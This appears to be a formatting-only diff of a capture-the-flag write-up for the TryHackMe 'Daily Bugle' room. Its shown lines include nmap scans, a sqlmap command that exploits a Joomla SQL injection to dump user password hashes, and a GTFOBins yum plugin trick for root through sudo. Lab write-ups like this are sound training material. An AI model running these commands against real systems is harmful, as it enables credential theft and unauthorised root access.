@@ -23,6 +23,7 @@ export target=10.10.175.125
 nmap $target -p- -A -oN tcp_ports.txt
 sudo nmap $target -sU -oN udp_ports.txt
 ```
+
 From the results:
 ```
 22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
@@ -70,6 +71,7 @@ This particular Joomla version is subject to an [SQL injection vulnerability](ht
 ```bash
 sqlmap -u "http://$target/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump -C username,password
 ```
+
 It gives:
 ![sqlmat output]({{ "/assets/img/daily-bugle-sqlmap.png"| absolute_url }})
 For manual exploitation of this blind SQLi, see [hack3rman's considerations](https://github.com/hack3rman/TryHackMe/blob/master/Daily%20Bugle.md) and [his python script](https://github.com/hack3rman/TryHackMe/blob/master/Scripts/db-blind.py).
@@ -130,7 +132,7 @@ which are the admin credentials for MySQL. The password is also good for the use
 
 ## Abusing sudo and yum
 
-Checking `sudo -l`is one of the quickest win:
+Checking `sudo -l` is one of the quickest win:
 ```
 Matching Defaults entries for jjameson on dailybugle:
 	!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
@@ -145,7 +147,7 @@ User jjameson may run the following commands on dailybugle:
 	(ALL) NOPASSWD: /usr/bin/yum
 ```
 
-According to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/), `yum`can be abused to get full privileges:
+According to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/), `yum` can be abused to get full privileges:
 ```bash
 TF=$(mktemp -d)
 cat >$TF/x<<EOF
@@ -171,5 +173,4 @@ EOF
 
 sudo yum -c $TF/x --enableplugin=y
 ```
-
 ![root shell]({{ "/assets/img/daily-bugle-root.png" | absolute_url }})
